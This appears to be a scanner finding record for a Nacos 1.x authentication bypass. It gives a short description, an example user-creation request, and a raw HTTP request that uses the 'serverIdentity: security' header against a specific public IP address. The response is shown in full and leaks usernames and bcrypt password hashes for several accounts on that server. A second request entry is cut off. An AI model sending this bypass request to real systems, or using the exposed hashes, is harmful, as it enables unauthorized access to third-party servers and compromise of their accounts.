info.name: Nacos 1.x - Authentication Bypass
info.author: taielab,pikpikcu,SleepingBag945
info.description: Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.

req_resp.req:
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
HOST: 101.42.221.234
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
serverIdentity: security
req_resp.resp:
HTTP/1.1 200
Content-Security-Policy: script-src 'self'
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Fri, 21 Mar 2025 14:30:00 GMT
Keep-Alive: timeout=60
Connection: keep-alive

{"totalCount":57,"pageNumber":1,"pagesAvailable":7,"pageItems":[{"username":"nacos","password":"$2a$10$Azgpz.tqR8FkR0eT15SVAuaENgoNi3ygAyoEJfdbWn186aqLiLw/u"},{"username":"ico","password":"$2a$10$paYqgxoCnGX4MuTb702DoemywBM9mg3hgD5juSQyo5xcYnlebMkrO"},{"username":"nacos_admin","password":"$2a$10$crVerRxFWHNfq23fIoNaLu3Rzf8gF6C05DzhtKfH.XVUF.8/fLpPC"},{"username":"test1234412","password":"$2a$10$67ExMWMuVsAEC67gbI2IAeRrpllKz27wP/I8x.LZevFhQi1/6.7H2"},{"username":"null","password":"$2a$10$7SfWOFVyaVKfa.qHl0YvDehKUO4fVgZNOU6fKV7gdLCdAlKmXeXOq"},{"username":"myworld1756","password":"$2a$10$SwSNvppPhtt0eaPTqRcslOzpjxUi7CHugoPC88h.yAQx4sbqJy2jW"},{"username":"myworld0376","password":"$2a$10$TZxE.6yxt17q4/vq8gWYlek2z867xZhcqPr99B.id2eJ67cjLfVP."},{"username":"qqqwww1240","password":"$2a$10$NomM6YnvtoCCP1JgDXKF0.j/HjM.IiwllJqJssQAc6PQbA2B6fVu6"},{"username":"wwwdddd1223555","password":"$2a$10$Vpt1yNhvKIcMRsHzPwAcc.UwP.h6hsYJAGbLrnSb/A5dqd6QPrZ/C"}]}

req_resp.req:

HOST: 101.42.221.234
